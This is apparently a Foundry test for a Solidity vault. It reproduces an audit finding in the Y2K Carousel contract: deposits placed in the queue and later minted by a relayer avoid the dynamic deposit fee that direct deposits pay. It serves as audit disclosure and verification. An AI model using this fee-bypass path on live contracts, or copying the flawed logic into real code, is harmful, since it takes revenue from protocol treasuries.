// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "../src/src/v2/Carousel/Carousel.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Y2KFeeMockToken is IERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    constructor(string memory n, string memory s) { name = n; symbol = s; }
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; totalSupply += amount; emit Transfer(address(0), to, amount); }
    function approve(address spender, uint256 amount) external override returns (bool) { allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true; }
    function transfer(address to, uint256 amount) external override returns (bool) { _transfer(msg.sender, to, amount); return true; }
    function transferFrom(address from, address to, uint256 amount) external override returns (bool) { uint256 allowed = allowance[from][msg.sender]; if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount; _transfer(from, to, amount); return true; }
    function _transfer(address from, address to, uint256 amount) internal { balanceOf[from] -= amount; balanceOf[to] += amount; emit Transfer(from, to, amount); }
}

/// Reproduces Sherlock #75 against the pre-fix Carousel source. The direct
/// path charges the dynamic deposit fee; the FILO queue path does not.
contract PoC_18535 is Test {
    Carousel internal vault;
    Y2KFeeMockToken internal asset;
    address internal directUser = address(0xD1);
    address internal queueUser = address(0xD2);
    address internal relayer = address(0xD3);

    function setUp() public {
        vm.warp(1_675_884_389);
        asset = new Y2KFeeMockToken("Underlying", "UND");
        vault = new Carousel(
            Carousel.ConstructorArgs(
                false, address(asset), "Carousel", "CAR", "uri", address(0x1234),
                1e18, address(this), address(this), address(0x4567), 1 ether, 250
            )
        );
        asset.mint(directUser, 100 ether);
        asset.mint(queueUser, 100 ether);
        vm.prank(directUser); asset.approve(address(vault), type(uint256).max);
        vm.prank(queueUser); asset.approve(address(vault), type(uint256).max);
        vault.setEpoch(uint40(block.timestamp + 100), uint40(block.timestamp + 200), 1);
    }

    function testQueueDepositMintsWithoutDynamicDepositFee() public {
        uint256 amount = 100 ether;
        uint256 treasuryBefore = asset.balanceOf(address(this));

        // At the end of the deposit window the direct path applies almost the
        // full 250-bps fee and transfers it to the real Carousel treasury.
        vm.warp(block.timestamp + 99);
        vm.prank(directUser);
        vault.deposit(1, amount, directUser);
        uint256 directShares = vault.balanceOf(directUser, 1);
        uint256 directFee = asset.balanceOf(address(this)) - treasuryBefore;
        assertGt(directFee, 2 ether);

        // The audited queue path accepts epoch 0, then mintDepositInQueue()
        // executes the queued item in FILO order without charging depositFee.
        vm.prank(queueUser);
        vault.deposit(0, amount, queueUser);
        uint256 feeBeforeQueueMint = asset.balanceOf(address(this));
        vm.prank(relayer);
        vault.mintDepositInQueue(1, 1);
        uint256 queueShares = vault.balanceOf(queueUser, 1);

        assertEq(asset.balanceOf(address(this)), feeBeforeQueueMint);
        assertEq(queueShares, amount - 1 ether);
        assertGt(queueShares, directShares);
        assertEq(asset.balanceOf(relayer), 1 ether);
    }
}
